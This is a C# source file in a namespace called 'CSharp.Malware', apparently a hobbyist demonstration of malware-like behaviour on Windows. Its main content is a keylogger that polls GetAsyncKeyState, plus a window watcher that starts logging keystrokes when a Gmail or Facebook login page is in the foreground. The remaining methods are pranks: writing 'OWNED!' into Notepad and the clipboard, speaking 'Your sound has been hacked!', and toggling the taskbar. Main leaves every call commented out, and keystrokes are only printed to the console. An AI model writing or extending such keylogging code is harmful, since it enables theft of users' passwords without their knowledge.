using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace CSharp.Malware
{
    public class Program
    {
        #region Constants

        private const string TASK_BAR = "Shell_TrayWnd";

        #endregion

        #region PInvoke

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("User32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern long GetWindowText(IntPtr hwnd, StringBuilder lpString, long cch);

        #endregion

        #region Main

        /// <summary>
        /// This is the main method, where the program starts.
        /// </summary>
        /// <param name="args"></param>
        // To use Clipboard functions, uncomment the line below.
        //[STAThreadAttribute]
        public static void Main(string[] args)
        {
            //CheckWindowOpened();
            //CheckKeyboard();
            //OpenInternetExplorer();
            //OpenNotePad();
            //SpeakToMe();
            //ShowOrNotTheTaskBar();
            //SetClipboard();

            FinishProgram();
        }

        #endregion

        #region Auxiliary Methods

        /// <summary>
        /// This method gets the window opend and check for a string on int.
        /// </summary>
        private static void CheckWindowOpened()
        {
            while (true)
            {
                IntPtr handle = GetForegroundWindow();

                StringBuilder buff = new StringBuilder(string.Empty, int.MaxValue);

                if (GetWindowText(handle, buff, int.MaxValue) > 0)
                {
                    string line = buff.ToString();

                    if (line.Contains("Gmail") || line.Contains("Facebook - Log In or Sign Up "))
                        CheckKeyboard();
                }

                Thread.Sleep(100);
            }
        }

        /// <summary>
        /// This method act like a Keylogger
        /// </summary>
        private static void CheckKeyboard()
        {
            while (true)
            {
                Thread.Sleep(100);

                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);

                    if (state == 1 || state == -32767)
                        Console.WriteLine((Keys)i);
                }
            }
        }

        /// <summary>
        /// This method open the Internet Explorer and access the author site.
        /// </summary>
        private static void OpenInternetExplorer()
        {
            Process.Start("iexplore", "cassiobp.com.br");
        }

        /// <summary>
        /// This method open the Notepad.exe and write some text.
        /// </summary>
        private static void OpenNotePad()
        {
            Process.Start("Notepad");
            Thread.Sleep(1000);
            SendKeys.SendWait("Notepad OWNED!");
        }

        /// <summary>
        /// This method just "say" the string. Audio required!
        /// </summary>
        private static void SpeakToMe()
        {
            var audio = new SpeechSynthesizer();
            audio.Speak("Your sound has been hacked!");
        }

        /// <summary>
        /// This method shows or hide the Windows Task Bar
        /// </summary>
        private static void ShowOrNotTheTaskBar()
        {
            var taskBarWindow = FindWindow(TASK_BAR, "");
            ShowWindow(taskBarWindow, 1);
        }

        /// <summary>
        /// This method, place a constant string to the clipboard.
        /// </summary>
        private static void SetClipboard()
        {
            Clipboard.SetText("Clipboard OWNED!");
        }

        /// <summary>
        /// This method shows a finish message on the console.
        /// </summary>
        private static void FinishProgram()
        {
            Console.WriteLine("Program finished.");
            Console.ReadKey();
        }

        #endregion
    }
}